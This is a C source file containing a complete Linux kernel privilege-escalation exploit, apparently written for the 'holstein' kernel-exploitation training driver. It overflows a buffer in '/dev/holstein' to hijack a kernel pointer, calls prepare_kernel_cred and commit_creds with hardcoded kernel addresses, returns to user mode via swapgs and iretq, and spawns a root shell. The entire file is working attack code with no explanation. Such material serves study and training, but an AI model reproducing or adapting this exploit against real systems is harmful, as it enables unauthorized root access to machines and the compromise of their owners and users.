#include <fcntl.h>   // for open, O_RDWR
#include <stdint.h>  // for uintptr_t, uint8_t
#include <stdio.h>   // for NULL, perror, puts
#include <stdlib.h>  // for EXIT_FAILURE, EXIT_SUCCESS
#include <unistd.h>  // for close, execve, write

uintptr_t cs;
uintptr_t rflags;
uintptr_t rsp;
uintptr_t ss;

static void save_state(void)
{
	asm volatile("movq %%cs, %[cs]\n\t"
		     "pushfq\n\t"
		     "popq %[rflags]\n\t"
		     "movq %%rsp, %[rsp]\n\t"
		     "movq %%ss, %[ss]"
		     : [cs] "=r"(cs), [rflags] "=r"(rflags), [rsp] "=r"(rsp),
		       [ss] "=r"(ss));
}

static void shell(void)
{
	puts("[+] get r00t!");
	execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
}

static void get_root(void)
{
	register uintptr_t g_buf asm("r12")			= 0xffffffffc0002440;
	register uintptr_t prepare_kernel_cred asm("r13")	= 0xffffffff8106e240;
	register uintptr_t commit_creds asm("r14")		= 0xffffffff8106e390;

	asm volatile("movq $0, %%rdi\n\t"
		     "call *%[prepare_kernel_cred]\n\t"

		     "movq %%rax, %%rdi\n\t"
		     "call *%[commit_creds]\n\t"

		     "swapgs\n\t"
		     "movq (%[g_buf]), %%r15\n\t"
		     "pushq 0x20(%%r15)\n\t"
		     "pushq 0x18(%%r15)\n\t"
		     "pushq 0x10(%%r15)\n\t"
		     "pushq 0x08(%%r15)\n\t"
		     "pushq 0x00(%%r15)\n\t"
		     "iretq"
		     :
		     : [prepare_kernel_cred] "r"(prepare_kernel_cred),
		       [commit_creds] "r"(commit_creds), [g_buf] "r"(g_buf));
}

int main(void)
{
	uint8_t data[0x410] = { 0 };
	uintptr_t *r;
	int fd;

	save_state();

	fd = open("/dev/holstein", O_RDWR);
	if (fd == -1) {
		perror("[-] open");
		return EXIT_FAILURE;
	}

	r = (uintptr_t *)data;
	*r++ = (uintptr_t)shell;
	*r++ = cs;
	*r++ = rflags;
	*r++ = rsp;
	*r++ = ss;

	*(uintptr_t *)&data[0x408] = (uintptr_t)get_root;
	write(fd, data, 0x410);

	close(fd);
	return EXIT_SUCCESS;
}
